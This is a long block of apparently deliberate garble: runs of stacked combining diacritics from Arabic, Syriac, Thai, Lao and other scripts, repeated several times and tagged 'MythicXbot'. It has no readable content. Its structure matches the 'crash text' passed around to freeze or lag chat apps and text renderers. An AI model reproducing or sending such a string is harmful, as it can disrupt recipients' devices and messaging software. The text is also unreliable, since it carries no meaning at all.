ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴Myth
icXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX
bot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔ
ৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅